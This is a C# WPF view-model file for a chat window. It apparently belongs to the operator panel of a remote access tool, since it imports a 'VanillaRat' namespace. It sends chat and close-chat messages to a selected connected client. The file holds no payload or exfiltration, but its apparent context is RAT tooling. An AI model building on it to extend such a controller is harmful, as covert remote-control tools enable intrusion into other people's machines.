using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Automation.Peers;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Threading;
using TaskManager.Command;
using VanillaRat.Classes;
using WpfApp15.Scripts.Other;
using WpfApp15.ViewModel;

namespace WpfApp15.Scripts.Model.Program
{
    class ChatWindowModel : MainViewModel
    {
        public ChatWindowModel(Window window):base(window)
        {
            Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("[<MESSAGE>]Opened chat"));
            CloseChatWindowCommand = new RelayCommand2(async () => {await Task.Run(()=> Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("CloseChat"))); TaskManager.ViewModel.ChatActive = false; });
            SendMessage = new RelayCommand2(async () => { await SentAsync();  });
        }
        private async Task SentAsync()
        {
            Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("[<MESSAGE>]" + Text));
            await Items.AddAsync(new StringValue() { Name= "Ты: " + Text });
            Text = "";
        }
        public static ObservableCollection<StringValue> Items = new ObservableCollection<StringValue>();
        public string text { get; set; }
        public string Text
        {
            get => text;
            set
            {
                 text=value;
                OnPropertyChanged(nameof(Text));
            }
        }
        public ICommand CloseChatWindowCommand { get; set; }
        public ICommand SendMessage { get; set; }
    }
}
